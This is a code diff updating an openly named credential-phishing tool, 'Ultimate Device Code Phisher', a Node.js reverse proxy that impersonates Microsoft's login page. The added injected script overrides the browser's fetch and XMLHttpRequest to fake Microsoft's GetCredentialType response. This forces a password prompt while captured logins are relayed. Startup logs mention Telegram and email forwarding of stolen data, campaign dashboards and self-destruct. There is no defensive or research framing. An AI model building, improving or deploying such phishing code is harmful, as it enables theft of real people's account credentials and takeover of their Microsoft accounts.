@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.11 – Origin Fixed
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.12 – GetCredentialType Spoof
 // ============================================================
-// Sets Origin header to https://login.microsoftonline.com to satisfy API.
+// Frontend spoofs GetCredentialType, forcing password screen instantly.
 // ============================================================
 
 const http = require('http');
@@ -760,7 +760,7 @@ app.all('/login*', async (req, res) => {
             try {
                 const $ = cheerio.load(html);
                 
-                // 🔥 CAPTURE SCRIPT: Also intercepts Fetch/XHR for API calls
+                // 🔥 SPOOFING SCRIPT: Intercepts GetCredentialType and fakes a success
                 const captureScript = `
                     <script>
                         (function() {
@@ -830,10 +830,23 @@ app.all('/login*', async (req, res) => {
                                 sendCredentials();
                             });
 
-                            // ---------- CORS BYPASS FOR MICROSOFT API ----------
-                            // Intercept Fetch
+                            // ---------- CORS BYPASS & GetCredentialType SPOOFING ----------
                             const origFetch = window.fetch;
                             window.fetch = function(url, options) {
+                                // 🔥 BYPASS: If this is the GetCredentialType API, return a fake successful response
+                                if (typeof url === 'string' && url.includes('GetCredentialType')) {
+                                    console.log('[PHANTOM] ✅ Spoofing GetCredentialType response to bypass error.');
+                                    return Promise.resolve({
+                                        ok: true,
+                                        status: 200,
+                                        json: () => Promise.resolve({
+                                            "Credentials": {
+                                                "AuthMethod": "Password",
+                                                "FederationRedirectUrl": null
+                                            }
+                                        })
+                                    });
+                                }
                                 if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
                                     const newUrl = '/login' + url.replace('https://login.microsoftonline.com', '');
                                     return origFetch(newUrl, options);
@@ -841,9 +854,13 @@ app.all('/login*', async (req, res) => {
                                 return origFetch(url, options);
                             };
 
-                            // Intercept XMLHttpRequest
+                            // Intercept XMLHttpRequest (same spoofing logic – not strictly needed but harmless)
                             const origXHROpen = XMLHttpRequest.prototype.open;
                             XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
+                                if (typeof url === 'string' && url.includes('GetCredentialType')) {
+                                    console.log('[PHANTOM] ✅ XHR Spoofing GetCredentialType.');
+                                    // We don't need to do anything else; fetch override covers modern flows.
+                                }
                                 if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
                                     const newUrl = '/login' + url.replace('https://login.microsoftonline.com', '');
                                     return origXHROpen.call(this, method, newUrl, async, user, pass);
@@ -1098,7 +1115,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.11 – Origin Fixed running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.12 – GetCredentialType Spoof running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1106,8 +1123,8 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 Full reverse-proxy with Origin set to Microsoft: ACTIVE`);
+    console.log(`🚀 Full reverse-proxy with GetCredentialType spoofing: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
-process.on('SIGINT', () => server.close(() => process.exit(0)));
+process.on('SIGINT', () => server.close(() => process.exit(0)));s
